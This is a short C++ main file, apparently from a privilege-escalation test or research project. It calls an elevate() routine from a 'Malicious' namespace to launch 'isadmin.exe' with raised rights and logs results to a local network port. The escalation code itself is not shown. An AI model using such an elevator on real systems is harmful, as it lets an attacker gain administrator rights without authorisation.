#include <common/Log.hpp>
using namespace Common;

#include <system/Process.hpp>

#include <malicious/Elevator.hpp>
using namespace Malicious;

int main(int argc, char *argv[])
{
	try
	{
		LOG.setHeader("ELEVATOR");
		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));

		System::Process::This thisProcess;

		return elevate(thisProcess.getProgramDir()+"\\isadmin.exe");
    }
    catch(std::exception& e)
    {
        LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknown exception";
	}
	return EXIT_FAILURE;
}
